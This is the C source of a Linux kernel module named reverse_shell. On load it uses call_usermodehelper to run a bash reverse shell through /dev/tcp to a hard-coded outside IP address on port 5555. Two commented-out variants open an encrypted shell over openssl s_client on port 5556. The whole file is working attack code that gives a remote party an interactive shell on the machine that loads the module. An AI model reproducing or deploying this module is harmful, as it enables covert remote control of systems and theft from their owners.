#include <linux/kmod.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

MODULE_LICENSE("GPL");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/3.135.235.154/5555 0>&1", NULL};
//char* argv[] = {"/bin/bash","-c", "openssl s_client -connect 3.135.235.154:5556 > /bin/bash"};
//char* argv[] = {"/bin/bash","-c","mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 3.135.235.154:5556 > /tmp/s; rm /tmp/s", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
